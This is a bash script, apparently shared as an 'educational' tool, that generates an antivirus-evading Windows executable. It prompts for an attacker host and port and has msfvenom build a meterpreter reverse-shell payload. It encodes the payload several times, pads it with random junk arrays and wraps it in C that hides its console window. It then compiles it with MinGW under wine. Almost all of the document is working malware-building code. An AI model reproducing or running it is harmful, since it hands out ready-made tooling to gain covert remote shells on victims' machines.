#!/bin/bash#Created by Alex Williams#This script is for educational purposes only. I am not responsible for your ignorance/stupidity.#This code is simple. If you want to update it, please do. But send me a copy and also reference me as an author.bannr="Custom MSFVenom Executable Generator"clearecho $bannrcheckdir="/root/.wine/drive_c/MinGW/bin"if [ ! -d "$checkdir" ]; then echo "MinGW for Windows not found on this system. Please install it first."	exitfiechoecho "We're going to generate some shellcode!"echo "Be sure to take what you want out of the ShellCode folder."echoread -p "LHOST: " ipread -p "LPORT: " lprtclearecho $bannrechoecho "LHOST set to $ip and the LPORT is set to $lprt."echoecho "We will be using the windows/meterpreter/reverse_x payloads."echo "Which would you like to use?"read -p "windows/meterpreter/reverse_" listenrread -p "How many encoding iterations? " enumberread -p "Okay, and how many lines of 'fluff?' Do not exceed 600. " seedclearecho $bannrechoecho "Alright, so we're going to be listening on $ip:$lprt with the"echo "payload windows/meterpreter/reverse_$listenr. You want $enumber"echo "iterations of encoding with $seed lines of fluff."read -p "Press any key to continue..."#Begin generationdirectory="/usr/share/metasploit-framework/ShellCode"if [ ! -d "$directory" ]; then	echo "Creating the ShellCode folder in the metasploit directory..."	mkdir $directoryfiif test "$(ls -A "$directory")"; then 	echo "Cleaning out the ShellCode directory"	rm $directory/*ficd /usr/share/metasploit-frameworkecho "Generating shellcode..."msfvenom -p windows/meterpreter/reverse_${listenr} LHOST=$ip LPORT=$lprt EXITFUNC=process --platform windows -e generic/none -i 1 -a x86 -f raw | msfvenom -p - --platform windows -a x86 -e x86/shikata_ga_nai -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/jmp_call_additive -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/call4_dword_xor -i $enumber -f raw | msfvenom -p - --platform windows -a x86 -e x86/shikata_ga_nai -i $enumber -f c -o $directory/test.ccd ShellCodeecho "Shellcode generated."echo "Cleaning it up..."sed '1d' test.c > aready.cecho "unsigned char micro[]=" > varcat var > ready.ccat aready.c >> ready.cecho "Creating Headers..."echo "#include <stdio.h>" >> tempecho "#define _WIN32_WINNT 0x0500" >> tempecho "#include <windows.h>" >> tempecho 'unsigned char ufs[]=' >> tempecho "Creating the first bit of fluff"for (( i=1; i<=10000;i++ )) do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed >> temp2sed -i 's/$/"/' temp2sed -i 's/^/"/' temp2echo ';' >> temp2cat temp2 >> tempcat ready.c >> tempmv temp ready2.cecho ";" >> ready2.cecho "Creating the execution bit..."echo "int main(void) { " >> ready2.cecho "HWND hWnd = GetConsoleWindow();" >> ready2.cecho "ShowWindow( hWnd, SW_HIDE );((void (*)())micro)();}" >> ready2.cmv ready2.c final.cecho "Creating the last bit of fluff..."echo 'unsigned char tap[]=' > temp3for (( i=1; i<=999999;i++ )) do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed >> temp4sed -i 's/$/"/' temp4sed -i 's/^/"/' temp4echo ';' >> temp4cat temp4 >> temp3echo "Merging the last of it together..."cat temp3 >> final.coutdir="/root/out"if [ ! -d "$outdir" ]; then echo "Creating the out folder in the root directory..." mkdir $outdirficd /root/.wine/drive_c/MinGW/bin/wine gcc.exe -o /root/out/final.exe /usr/share/metasploit-framework/ShellCode/final.c -lwsock32cd /root/out/mv final.exe "$listenr-$lprt-$RANDOM.exe"filex=`ls -ct1 | head -1`sumx=`sha1sum $filex`echo $filex "SHA-1 Checksum is .." $sumxstrip --strip-debug $filexecho "Done!"